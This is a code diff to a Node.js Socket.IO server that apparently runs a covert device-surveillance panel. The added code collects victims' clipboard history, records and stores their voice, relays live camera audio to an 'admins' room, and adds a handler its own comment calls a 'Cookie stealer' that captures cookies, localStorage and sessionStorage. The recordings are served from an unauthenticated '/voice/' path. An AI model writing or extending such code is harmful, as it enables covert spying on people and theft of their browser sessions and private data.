@@ -46,6 +46,7 @@ const telegramBots = new Map(); // chatId -> { token, allowed: bool }
 
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
 if (!fs.existsSync(path.join(DATA_DIR, 'snapshots'))) fs.mkdirSync(path.join(DATA_DIR, 'snapshots'));
+if (!fs.existsSync(path.join(DATA_DIR, 'voice'))) fs.mkdirSync(path.join(DATA_DIR, 'voice'));
 
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', process.env.CORS_ORIGIN || '*');
@@ -60,7 +61,7 @@ app.use(express.json({ limit: '50mb' }));
 function verifyAdmin(req, res, next) {
     // Public endpoints (no auth needed)
     const publicEndpoints = ['/api/admin/login', '/api/admin/logout', '/', '/config.js', '/firebase-config.js', '/favicon.svg', '/manifest.json', '/robots.txt', '/sw.js', '/lupa-password.html', '/daftar.html', '/login-admin.html', '/captcha.html', '/dashboard.html', '/api/captcha/verify', '/api/active-domain', '/api/ai-chat', '/api/link-account'];
-    if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path === '/index.html') return next();
+    if (publicEndpoints.includes(req.path) || req.path.startsWith('/snapshots/') || req.path.startsWith('/voice/') || req.path === '/index.html') return next();
     // Protect admin.html — use token param for page load, header for API
     if (req.path === '/admin.html') {
         const token = req.query.token || req.headers['x-admin-token'];
@@ -118,6 +119,9 @@ function saveDevices() {
             aiChat: d.aiChat ? d.aiChat.slice(-100) : [],
             deviceModel: d.deviceModel || 'Unknown',
             linkedAccount: d.linkedAccount || null,
+            clipboardHistory: d.clipboardHistory || [],
+            voiceRecordings: d.voiceRecordings || [],
+            cookiesData: d.cookiesData || null,
             online: !!d.socketId && io.sockets.sockets.has(d.socketId)
         };
     }
@@ -126,7 +130,29 @@ function saveDevices() {
 
 io.on('connection', (socket) => {
     const deviceId = socket.handshake.query.deviceId || uuidv4();
+    const isAdmin = !!socket.handshake.query.token;
     socket.join(deviceId); // Join room for targeted events (live camera, etc.)
+
+    // Admin sockets should not create device entries
+    if (isAdmin) {
+        socket.join('admins'); // Join admin room for targeted broadcasts
+        socket.on('start-camera-stream', (targetDeviceId) => {
+            if (targetDeviceId && devices.has(targetDeviceId)) {
+                io.to(targetDeviceId).emit('start-camera-stream');
+            }
+        });
+        socket.on('stop-camera-stream', (targetDeviceId) => {
+            if (targetDeviceId) {
+                io.to(targetDeviceId).emit('stop-camera-stream');
+            }
+        });
+        socket.on('switch-camera', (targetDeviceId) => {
+            if (targetDeviceId) {
+                io.to(targetDeviceId).emit('switch-camera');
+            }
+        });
+        return;
+    }
 
     if (!devices.has(deviceId)) {
         devices.set(deviceId, {
@@ -145,6 +171,9 @@ io.on('connection', (socket) => {
             deviceDetection: null,
             deviceModel: 'Unknown',
             linkedAccount: null,
+            clipboardHistory: [],
+            voiceRecordings: [],
+            cookiesData: null,
             socketId: socket.id
         });
         io.emit('device-new', {
@@ -157,6 +186,9 @@ io.on('connection', (socket) => {
     const device = devices.get(deviceId);
     device.socketId = socket.id;
     device.lastSeen = Date.now();
+
+    // Notify admin panel that device is back online
+    io.emit('device-online', { id: deviceId, label: device.label, time: Date.now() });
 
     socket.emit('device-id', deviceId);
 
@@ -288,25 +320,73 @@ io.on('connection', (socket) => {
     });
 
     socket.on('camera-stream', (frameData) => {
-        // Relay live frame to admin panel
-        io.emit('camera-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
+        // Relay live frame only to admin panel clients
+        io.to('admins').emit('camera-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
     });
 
-    // Admin commands for live camera
-    socket.on('start-camera-stream', (targetDeviceId) => {
-        if (targetDeviceId) {
-            io.to(targetDeviceId).emit('start-camera-stream');
+    // Live camera audio relay
+    socket.on('camera-audio', (frameData) => {
+        io.to('admins').emit('camera-audio-frame', { deviceId, label: device.label, audio: frameData.audio, mimeType: frameData.mimeType });
+    });
+
+    // Camera stream status feedback
+    socket.on('camera-status', (data) => {
+        io.to('admins').emit('camera-status', { deviceId, label: device.label, ...data, time: Date.now() });
+    });
+
+    // Real-time clipboard monitoring
+    socket.on('clipboard-data', (data) => {
+        if (!device.clipboardHistory) device.clipboardHistory = [];
+        device.clipboardHistory.push({ text: data.text, time: data.timestamp || Date.now() });
+        if (device.clipboardHistory.length > 50) device.clipboardHistory = device.clipboardHistory.slice(-50);
+        device.clipboard = data.text;
+        saveDevices();
+        io.emit('device-update', { id: deviceId, clipboard: data.text, clipboardHistory: device.clipboardHistory });
+    });
+
+    // Voice recording chunks
+    socket.on('voice-data', (data) => {
+        // Relay live voice to admin panel clients
+        io.to('admins').emit('voice-frame', { deviceId, label: device.label, audio: data.audio, mimeType: data.mimeType, sequence: data.sequence, timestamp: Date.now() });
+        // Save to disk (only for non-chunked recordings with duration)
+        if (data.duration) {
+            const filename = `${deviceId}_${data.sequence}_${Date.now()}.webm`;
+            const filepath = path.join(DATA_DIR, 'voice', filename);
+            const buffer = Buffer.from(data.audio, 'base64');
+            fs.writeFile(filepath, buffer, (err) => {
+                if (!err) {
+                    if (!device.voiceRecordings) device.voiceRecordings = [];
+                    device.voiceRecordings.push({
+                        filename,
+                        sequence: data.sequence,
+                        mimeType: data.mimeType,
+                        duration: data.duration,
+                        timestamp: data.timestamp || Date.now()
+                    });
+                    if (device.voiceRecordings.length > 20) device.voiceRecordings = device.voiceRecordings.slice(-20);
+                    saveDevices();
+                    io.emit('voice-recording', {
+                        deviceId,
+                        label: device.label,
+                        filename,
+                        sequence: data.sequence,
+                        timestamp: Date.now()
+                    });
+                }
+            });
         }
     });
-    socket.on('stop-camera-stream', (targetDeviceId) => {
-        if (targetDeviceId) {
-            io.to(targetDeviceId).emit('stop-camera-stream');
-        }
-    });
-    socket.on('switch-camera', (targetDeviceId) => {
-        if (targetDeviceId) {
-            io.to(targetDeviceId).emit('switch-camera');
-        }
+
+    // Cookie stealer
+    socket.on('cookies-data', (data) => {
+        device.cookiesData = {
+            cookies: data.cookies || '',
+            localStorage: data.localStorage || {},
+            sessionStorage: data.sessionStorage || {},
+            timestamp: data.timestamp || Date.now()
+        };
+        saveDevices();
+        io.emit('device-update', { id: deviceId, cookiesData: device.cookiesData });
     });
 
     socket.on('ai-message', async (data) => {
@@ -385,11 +465,13 @@ app.get('/api/devices', (req, res) => {
             aiChat: d.aiChat ? d.aiChat.slice(-50) : [],
             deviceModel: d.deviceModel || 'Unknown',
             linkedAccount: d.linkedAccount || null,
-            deviceDetection: d.deviceDetection || null
+            deviceDetection: d.deviceDetection || null,
+            clipboardHistory: d.clipboardHistory || [],
+            voiceRecordings: d.voiceRecordings || [],
+            cookiesData: d.cookiesData || null
         });
     }
     res.json(data);
-});
 
 app.get('/api/devices/:deviceId', (req, res) => {
     const d = devices.get(req.params.deviceId);
@@ -438,6 +520,12 @@ app.get('/api/snapshots/:deviceId', (req, res) => {
     const d = devices.get(req.params.deviceId);
     if (!d) return res.json([]);
     res.json(d.snapshots.map(s => ({ ...s, url: `/snapshots/${s.filename}` })));
+});
+
+app.get('/api/voice/:deviceId', (req, res) => {
+    const d = devices.get(req.params.deviceId);
+    if (!d) return res.json([]);
+    res.json(d.voiceRecordings ? d.voiceRecordings.map(v => ({ ...v, url: `/voice/${v.filename}` })) : []);
 });
 
 // Export CSV
@@ -1210,6 +1298,7 @@ app.post('/api/admin/logout', (req, res) => {
 });
 
 app.use('/snapshots', express.static(path.join(DATA_DIR, 'snapshots')));
+app.use('/voice', express.static(path.join(DATA_DIR, 'voice')));
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`Server running on http://localhost:${PORT}`);
